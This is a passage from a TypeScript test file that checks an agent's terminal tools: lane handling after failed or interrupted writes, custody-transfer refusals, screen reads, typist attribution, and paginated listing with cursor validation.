              ? Effect.fail(new WireLost({ reason: 'the connection dropped after the frame left', sent: true }))
              : Effect.succeed({
                  _tag: 'InputAdmitted',
                  receipt: { execution: ref, sequence: 0, cause: 'raw', bytes: 3, acceptedThrough: ByteOffset.make('3') },
                } satisfies InputAnswer),
        });
        const { tools } = yield* catalogOver(host, holder, null, 'run-doubt');
        yield* walk(tools.start_terminal as Tool, startInput('op-lane-doubt'));

        const doubted = (yield* walk(tools.write_terminal as Tool, writeInput(ref, 'op-lane-doubt-1'))) as Answer;
        expect(doubted.status).toBe('refused');
        expect(doubted.code).toBe('terminal-host-closed');
        expect((yield* keyOf('op-lane-doubt-1'))._tag).toBe('Uncertain');
        expect(host.asked().closeBinding).toBe(1);

        const next = (yield* walk(tools.write_terminal as Tool, writeInput(ref, 'op-lane-doubt-2'))) as {
          outcome?: { _tag: string; receipt?: { sequence: number } };
        };
        expect(next.outcome?._tag).toBe('InputAdmitted');
        expect(host.asked().openBinding).toBe(2);
        expect(host.asked().input).toBe(2);
      }),
  );

  it.effect(
    'a write interrupted while the host holds it settles its key uncertain and retires the lane, so the next write opens a fresh one',
    () =>
      Effect.gen(function* () {
        const { projectId } = yield* Fixture;
        const ref = execution('exec-lane-interrupted');
        let inputs = 0;
        const entered = yield* Deferred.make<void>();
        const host = laneHost(ref, {
          input: () =>
            inputs++ === 0
              ? Effect.andThen(Deferred.succeed(entered, undefined), Effect.never)
              : Effect.succeed({
                  _tag: 'InputAdmitted',
                  receipt: { execution: ref, sequence: 0, cause: 'raw', bytes: 3, acceptedThrough: ByteOffset.make('3') },
                } satisfies InputAnswer),
        });
        const over = yield* catalogOver(host, holder, null, 'run-interrupted');
        yield* walk(over.tools.start_terminal as Tool, startInput('op-lane-interrupted'));
        const record = yield* projected(ref.execution);
        const keyFor = (operationId: string): TerminalOperationKey => ({
          projectId,
          operationId: HostRequestKey.make(operationId),
          requester: record.holder,
          mutation: 'write',
          targetKey: record.targetKey,
          execution: ref,
        });
        const write = { _tag: 'Write', bytes: new TextEncoder().encode('ls\n') } as const;

        const typing = yield* Effect.forkChild(over.terminals.agentInput(keyFor('op-lane-interrupted-1'), 'run-interrupted', write, 'raw'));
        yield* Deferred.await(entered);
        expect(host.asked().input).toBe(1);
        yield* Fiber.interrupt(typing);
        expect((yield* keyOf('op-lane-interrupted-1'))._tag).toBe('Uncertain');
        expect(host.asked().closeBinding).toBe(1);

        const next = yield* over.terminals.agentInput(keyFor('op-lane-interrupted-2'), 'run-interrupted', write, 'raw');
        expect(next._tag).toBe('InputAdmitted');
        expect(host.asked().openBinding).toBe(2);
      }),
  );

  it.effect('a caller with no run types through a lane closed after each act', () =>
    Effect.gen(function* () {
      const ref = execution('exec-lane-runless');
      const host = laneHost(ref);
      const { tools } = yield* catalogOver(host, holder, null, null);
      yield* walk(tools.start_terminal as Tool, startInput('op-lane-runless'));
      const first = (yield* walk(tools.write_terminal as Tool, writeInput(ref, 'op-lane-runless-1'))) as { outcome?: { _tag: string } };
      const second = (yield* walk(tools.write_terminal as Tool, writeInput(ref, 'op-lane-runless-2'))) as { outcome?: { _tag: string } };
      expect(first.outcome?._tag).toBe('InputAdmitted');
      expect(second.outcome?._tag).toBe('InputAdmitted');
      expect(host.asked().openBinding).toBe(2);
      expect(host.asked().closeBinding).toBe(2);
    }),
  );

  it.effect('a transfer the host refused answers refused, never ok, and was presented with the holder’s own principal and no lane', () =>
    Effect.gen(function* () {
      const ref = execution('exec-custody-refused');
      const presented: string[] = [];
      const host = hostThat({
        start: () => Effect.succeed(started(ref)),
        custody: (_request, principal) =>
          Effect.sync(() => {
            presented.push(principal);
            return {
              _tag: 'Refused',
              operation: { installation, operation: HostRequestKey.make('unused') },
              refusal: { _tag: 'CustodyConflict', reason: 'another custody act is deciding this execution' },
            } satisfies CustodyAnswer;
          }),
      });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-custody-refused'));
      const record = yield* projected(ref.execution);

      const answer = (yield* walk(tools.transfer_terminal as Tool, {
        operationId: 'op-custody-transfer-refused',
        execution: ref.execution,
        incarnation: ref.incarnation,
        expected: record.revision,
      })) as Answer;
      expect(answer.status).toBe('refused');
      expect(answer.code).toBe('terminal-host-refused-CustodyConflict');
      expect(host.asked().custody).toBe(1);
      expect(presented).toEqual([record.holder]);
      expect(host.asked().openBinding).toBeUndefined();
    }),
  );

  it.effect('a read answers state null when the host is silent', () =>
    Effect.gen(function* () {
      const ref = execution('exec-state-silent');
      const host = hostThat({ start: () => Effect.succeed(started(ref)), state: () => Effect.succeed(undefined) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-state-silent'));

      const answer = (yield* walk(tools.read_terminal as Tool, { execution: ref.execution, incarnation: ref.incarnation })) as {
        status: string;
        state?: unknown;
      };
      expect(answer.status).toBe('ok');
      expect('state' in answer).toBe(true);
      expect(answer.state).toBeNull();
    }),
  );

  it.effect('a read of a terminal whose host generation was replaced answers that it ended with that host', () =>
    Effect.gen(function* () {
      const ref = execution('exec-host-replaced');
      const host = hostThat({ start: () => Effect.succeed(started(ref)), state: () => Effect.succeed(undefined), generation: 2 });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-host-replaced'));

      const answer = (yield* walk(tools.read_terminal as Tool, { execution: ref.execution, incarnation: ref.incarnation })) as {
        status: string;
        endedWithHost: boolean;
        state: { phase: string } | null;
      };
      expect(answer).toMatchObject({ status: 'ok', endedWithHost: true, state: { phase: 'ended' } });
    }),
  );

  it.effect('a screen read answers the rows as text, and no cell survives into the answer', () =>
    Effect.gen(function* () {
      const ref = execution('exec-screen-text');
      const host = hostThat({ start: () => Effect.succeed(started(ref)), screen: () => Effect.succeed(screenOf(ref, VITE, 140)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-screen-text'));

      const answer = (yield* walk(tools.read_terminal_screen as Tool, { execution: ref.execution, incarnation: ref.incarnation })) as {
        status: string;
        screen: ScreenAnswer;
      };
      expect(answer.status).toBe('ok');
      expect(answer.screen._tag).toBe('ScreenTextFrame');
      if (answer.screen._tag !== 'ScreenTextFrame') return;
      expect(answer.screen.rows[0]).toEqual({ line: 0, wrapped: false, text: '$ vite dev' });
      expect(answer.screen.rows.map((row) => row.text)).toEqual(VITE);
      expect(answer.screen.provenance.revision).toBe(7);
      expect(answer.screen.geometry).toEqual({ rows: 5, columns: 140, firstLine: 0, viewportLine: 0 });
      expect(answer.screen.cursor).toEqual({ line: 2, column: 5 });
      expect(host.asked().screen).toBe(1);
    }),
  );

  it.effect('a screen read names who else typed into the terminal with the time of its newest act, and never the reading thread', () =>
    Effect.gen(function* () {
      const { terminalStore } = yield* Fixture;
      const ref = execution('exec-screen-typed-by');
      const host = hostThat({ start: () => Effect.succeed(started(ref)), screen: () => Effect.succeed(screenOf(ref, VITE, 140)) });
      const writers = yield* terminalWriters({ terminalRows: terminalStore.terminalRows });
      const { tools } = yield* catalogOver(host, holder, writers);
      yield* walk(tools.start_terminal as Tool, startInput('op-screen-typed-by'));
      const receipt = (through: string) => ({
        execution: ref,
        sequence: 0,
        cause: 'typed' as const,
        bytes: 1,
        acceptedThrough: ByteOffset.make(through),
      });
      const read = Effect.map(
        walk(tools.read_terminal_screen as Tool, { execution: ref.execution, incarnation: ref.incarnation }),
        (answer) => (answer as { typedBy?: readonly { readonly writer: string; readonly at: string }[] }).typedBy,
      );

      yield* writers.admitted(ref, Principal.make(`thread:${holder}`), receipt('1'), 1_000);
      expect(yield* read).toBeUndefined();
      yield* writers.admitted(ref, Principal.make('operator'), receipt('2'), 2_000);
      expect(yield* read).toEqual([{ writer: 'operator', at: new Date(2_000).toISOString() }]);
    }),
  );

  it.effect('a screen read answers typed cells with their style when the caller asks for them', () =>
    Effect.gen(function* () {
      const ref = execution('exec-screen-cells');
      const host = hostThat({ start: () => Effect.succeed(started(ref)), screen: () => Effect.succeed(screenOf(ref, VITE, 140)) });
      const tools = yield* toolsOver(host);
      yield* walk(tools.start_terminal as Tool, startInput('op-screen-cells'));

      const answer = (yield* walk(tools.read_terminal_screen as Tool, {
        execution: ref.execution,
        incarnation: ref.incarnation,
        cells: true,
      })) as { status: string; screen: ScreenAnswer };
      expect(answer.status).toBe('ok');
      expect(answer.screen._tag).toBe('ScreenFrame');
      if (answer.screen._tag !== 'ScreenFrame') return;
      expect(answer.screen.rows[0]?.cells.length).toBe(140);
      expect(answer.screen.rows[0]?.cells[0]).toEqual({ chars: '$', width: 1, style: CELL_STYLE });
      expect(answer.screen.appearance.title).toBe('vite');
    }),
  );

  it.effect('a declared start opens its starter’s lane and moves no custody, and the run’s write types through that lane', () =>
    Effect.gen(function* () {
      const ref = execution('exec-declared-lane');
      const host = laneHost(ref);
      const tools = yield* toolsOver(host);
      const startedAnswer = (yield* walk(tools.start_terminal as Tool, { ...startInput('op-declared-lane'), stdin: 'pipe' })) as Answer;
      expect(startedAnswer.status).toBe('ok');
      expect(host.asked().openBinding).toBe(1);
      expect(host.asked().custody).toBeUndefined();

      const typed = (yield* walk(tools.write_terminal as Tool, writeInput(ref, 'op-declared-lane-write'))) as {
        outcome?: { _tag: string };
      };
      expect(typed.outcome?._tag).toBe('InputAdmitted');
      expect(host.asked().openBinding).toBe(1);
      expect(host.asked().input).toBe(1);
    }),
  );

  type Listing = {
    readonly status: string;
    readonly code?: string;
    readonly terminals: readonly { record: { execution: ExecutionRef } }[];
    readonly total: number;
    readonly next: string | null;
  };

  const startedAll = Effect.fnUntraced(function* (refs: readonly ExecutionRef[], operations: readonly string[]) {
    let at = 0;
    const tools = yield* toolsOver(hostThat({ start: () => Effect.succeed(started(refs[at++]!)) }));
    for (const operation of operations) yield* walk(tools.start_terminal as Tool, startInput(operation));
    return { tools, list: (input: unknown) => Effect.map(walk(tools.read_terminals as Tool, input), (answer) => answer as Listing) };
  });

  it.effect('read_terminals narrows to the execution the caller named', () =>
    Effect.gen(function* () {
      const wanted = execution('exec-listed-wanted');
      const { list } = yield* startedAll([wanted, execution('exec-listed-other')], ['op-listed-wanted', 'op-listed-other']);

      const narrowed = yield* list({ execution: wanted.execution });

      expect(narrowed.status).toBe('ok');
      expect(narrowed.terminals.map((row) => row.record.execution.execution)).toEqual([wanted.execution]);
    }),
  );

  it.effect('a named execution stays inside the custody bound of the listing', () =>
    Effect.gen(function* () {
      const { units, terminalStore } = yield* Fixture;
      const ref = execution('exec-listed-discharged');
      const { list } = yield* startedAll([ref], ['op-listed-discharged']);
      yield* units.write('terminalTools', (unit) => terminalStore.intents.discharge(unit, ref));

      const standing = yield* list({ execution: ref.execution });
      const history = yield* list({ execution: ref.execution, standing: false });

      expect(standing.terminals).toEqual([]);
      expect(history.terminals.map((row) => row.record.execution.execution)).toEqual([ref.execution]);
    }),
  );

  it.effect('read_terminals pages the standing roster to the end with no repeat or skip', () =>
    Effect.gen(function* () {
      const { list } = yield* startedAll(
        [execution('exec-page-a'), execution('exec-page-b'), execution('exec-page-c')],
        ['op-page-a', 'op-page-b', 'op-page-c'],
      );

      const seen: string[] = [];
      let cursor: string | undefined;
      let total = 0;
      for (let step = 0; step < 40; step += 1) {
        const answer = yield* list({ limit: 1, cursor });
        expect(answer.status).toBe('ok');
        total = answer.total;
        seen.push(...answer.terminals.map((row) => row.record.execution.execution));
        if (answer.next === null) break;
        cursor = answer.next;
      }
      expect(total).toBe(seen.length);
      expect(new Set(seen).size).toBe(seen.length);
      expect(seen).toContain('exec-page-a');
      expect(seen).toContain('exec-page-b');
      expect(seen).toContain('exec-page-c');
    }),
  );

  it.effect('a cursor handed back alone continues its own narrowing; a renamed one refuses it', () =>
    Effect.gen(function* () {
      const { units, terminalStore } = yield* Fixture;
      const one = execution('exec-narrow-one');
      const two = execution('exec-narrow-two');
      const { list } = yield* startedAll([one, two], ['op-narrow-one', 'op-narrow-two']);
      yield* units.write('terminalTools', (unit) => terminalStore.intents.discharge(unit, one));
      yield* units.write('terminalTools', (unit) => terminalStore.intents.discharge(unit, two));

      const first = yield* list({ standing: false, limit: 1 });
      expect(first.status).toBe('ok');
      expect(first.next).not.toBeNull();
      expect(first.total).toBeGreaterThan(1);

      const alone = yield* list({ cursor: first.next });
      expect(alone.status).toBe('ok');
      expect(alone.total).toBe(first.total);
      expect(alone.terminals.map((row) => row.record.execution.execution)).not.toContain(first.terminals[0]?.record.execution.execution);
      expect(alone.next).toBeNull();

      const renamed = yield* list({ standing: true, cursor: first.next });
      expect(renamed.status).toBe('refused');
      expect(renamed.code).toBe('cursor-stale');

      const forged = yield* list({ cursor: 'a-word-this-read-never-minted' });
      expect(forged.status).toBe('refused');
      expect(forged.code).toBe('bad-cursor');
    }),
  );
});
